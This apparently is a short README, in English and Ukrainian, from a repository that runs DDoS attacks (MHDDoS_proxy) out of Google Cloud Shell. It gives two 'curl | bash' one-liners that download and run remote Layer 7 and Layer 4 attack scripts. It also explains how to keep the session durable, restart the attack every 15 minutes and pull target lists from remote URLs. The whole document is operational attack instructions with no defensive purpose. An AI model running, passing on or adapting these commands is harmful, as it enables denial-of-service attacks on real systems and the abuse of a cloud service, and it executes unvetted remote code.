# DDoS whith Google Cloud Shell 
# MHDDoS_proxy
# 
Making script for durable cloudshell session

# ТЕСТ
Команди для запуску атаки

по Layer7:
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Test_L7m.sh | bash

по Layer4:
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Test_L4.sh | bash

У GCloudShell https://shell.cloud.google.com/?fromcloudshell=true&show=terminal вмикаємо Ephemeral Mode (ставимо - "Завжди")

Налаштовано: перезапуск скрипту кожні 15 хв, метод атаки додається зі списку цілей, параметр -t вказано 1200

Списки з цілями

https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst

https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4




IT ARMY of Ukraine
